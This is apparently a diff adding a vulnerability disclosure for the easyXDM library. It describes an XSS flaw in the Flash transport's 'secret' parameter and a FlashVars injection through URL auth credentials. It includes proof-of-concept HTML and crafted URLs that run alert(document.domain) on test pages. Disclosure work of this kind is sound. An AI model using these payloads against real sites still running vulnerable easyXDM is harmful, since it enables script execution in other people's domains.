@@ -1,0 +1,67 @@
+Vulnerability 1: XSS via 'secret' parameter in Flash transport
+==============================================================
+
+Proof of Concept
+----------------
+Some of the test pages of stock easyXDM installation use EasyXDM.debug.js
+script and call EasyXDM.Socket() or EasyXDM.Rpc() function.
+
+// http://jsbin.com/OriDibU/1
+<script type="text/javascript" src="
+http://easyxdm.net/current/easyXDM.debug.js";>
+</script>
+<script type="text/javascript">
+    var transport = new easyXDM.Socket({
+        local: ".",
+        swf: "http://easyxdm.net/current/easyxdm.swf";,
+    });
+</script>
+
+Calling this URL will trigger XSS:
+
+http://jsbin.com/OriDibU/1?#xdm_e=https%3A%2F%2Flossssscalhost&xdm_c=default7059&xdm_p=6&xdm_s=j%5C%22-alerssst(2)))%7Dcatch(e)%7Balert(document.domain)%7D%2F%2Feheheh
+
+(note - easyxdm.net-based PoC won't work, as version hosted there is
+already fixed)
+
+Sites implementing EasyXDM are vulnerable if easyxdm.debug.js is included
+anywhere in the codebase in documents that call  EasyXDM.Socket() or
+EasyXDM.Rpc(). This includes any sites where files from test/example
+subdirectory are reachable by URL e.g.
+
+http://easyxdm.net/current/tests/test_transport.html?#xdm_e=https%3A%2F%2Flossssscalhost&xdm_c=default7059&xdm_p=6&xdm_s=j%5C%22-alerssst(2)))%7Dcatch(e)%7Balert(location)%7D%2F%2Feheheh
+
+
+
+Vulnerability 2: FlashVars parameter injection via URL auth parameters
+======================================================================
+
+Proof of concept
+-----------------
+// http://jsbin.com/UMUHOgo/1
+
+<script type="text/javascript" src="http://easyxdm.net/current/easyXDM.js";>
+</script>
+<script type="text/javascript">
+    var transport = new easyXDM.Socket({
+        local: ".",
+        swf: "http://easyxdm.net/current/easyxdm.swf";,
+    });
+</script>
+
+Using the following credentials:
+
+user: jsbin.com&log=true&a=
+pass: <empty>
+
+and loading the following URL in Safari will inject log=true FlashVars
+parameter, which, combined with first vulnerability will trigger script
+execution in jsbin.com domain.
+
+http://jsbin.com&log=true&a=@
+jsbin.com/UMUHOgo/1?#xdm_e=https%3A%2F%2Flossssscalhost&xdm_c=default7059&xdm_p=6&xdm_s=j%5C%22-alerssst(2)))%7Dcatch(e)%7Balert(document.domain)%7D%2F%2Feheheh
+
+Potentially this can be leveraged to reflected XSS on other browsers that
+do not URL encode < and > characters in HTTP auth parameter, however all
+current browsers seem to escape that.
+
